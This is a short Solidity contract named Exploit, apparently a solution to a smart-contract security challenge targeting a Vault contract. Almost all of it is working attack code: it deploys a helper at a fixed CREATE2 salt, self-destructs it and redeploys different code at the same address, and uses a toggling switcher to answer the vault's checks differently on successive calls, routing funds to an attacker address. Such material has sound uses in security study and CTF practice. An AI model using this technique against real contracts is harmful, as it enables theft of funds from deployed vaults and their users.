// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "./Vault.sol";
import "./DeployWithCreate2.sol";

contract Exploit {
    bool private switcher;
    DeployWithCreate2 private lastContract;

    function firstDeploy(address vault, address attacker) public {
        DeployWithCreate2 _contract = new DeployWithCreate2{
            salt: bytes32(uint256(1000))
        }(vault, attacker);
        _contract.call2nd();
        _contract.destroy();
    }

    function secondDeploy(address vault, address attacker)
        public
        returns (address)
    {
        lastContract = new DeployWithCreate2{salt: bytes32(uint256(1000))}(
            vault,
            attacker
        );
        lastContract.callFourth();
    }

    function switcherValue() public returns (bool) {
        if (switcher) {
            return true;
        } else {
            switcher = true;
            return false;
        }
    }

    //was having a gas issue when doing it right after receiving the transfer in fallback function
    function transferFunds() external {
        lastContract.transferFunds();
    }
}
